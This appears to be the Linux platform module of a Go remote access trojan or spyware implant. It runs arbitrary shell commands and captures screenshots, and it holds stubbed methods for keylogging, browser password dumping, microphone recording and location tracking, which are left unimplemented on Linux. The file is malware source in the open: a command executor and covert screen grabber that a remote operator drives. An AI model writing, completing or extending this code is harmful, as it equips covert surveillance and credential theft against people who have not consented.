//go:build linux

package linux

import (
	"bytes"
	"fmt"
	"image/png"
	"os/exec"

	"github.com/kbinani/screenshot"
)

// LinuxPlatform represents the Linux platform.
type LinuxPlatform struct{}

// NewPlatform returns a new instance of the LinuxPlatform.
func NewPlatform() *LinuxPlatform {
	return &LinuxPlatform{}
}

// ExecuteCommand executes a command on Linux.
func (p *LinuxPlatform) ExecuteCommand(command string) ([]byte, error) {
	cmd := exec.Command("sh", "-c", command)
	return cmd.CombinedOutput()
}

// Init does nothing on Linux.
func (p *LinuxPlatform) Init() error {
	return nil
}

// StartKeylogger does nothing on Linux.
func (p *LinuxPlatform) StartKeylogger() {}

// GetKeylogs does nothing on Linux.
func (p *LinuxPlatform) GetKeylogs() string {
	return "Keylogger not implemented for Linux."
}

// DumpBrowsers does nothing on Linux.
func (p *LinuxPlatform) DumpBrowsers() string {
	return "Browser password dumping not implemented for Linux."
}

// Screenshot captures the primary display.
func (p *LinuxPlatform) Screenshot() ([]byte, error) {
	bounds := screenshot.GetDisplayBounds(0)
	img, err := screenshot.CaptureRect(bounds)
	if err != nil {
		return nil, err
	}

	var buf bytes.Buffer
	err = png.Encode(&buf, img)
	if err != nil {
		return nil, err
	}

	return buf.Bytes(), nil
}

// RecordMicrophone does nothing on Linux.
func (p *LinuxPlatform) RecordMicrophone() ([]byte, error) {
	return nil, fmt.Errorf("microphone recording not implemented for Linux")
}

// GetLocation does nothing on Linux.
func (p *LinuxPlatform) GetLocation() ([]byte, error) {
	return nil, fmt.Errorf("location tracking not implemented for Linux")
}
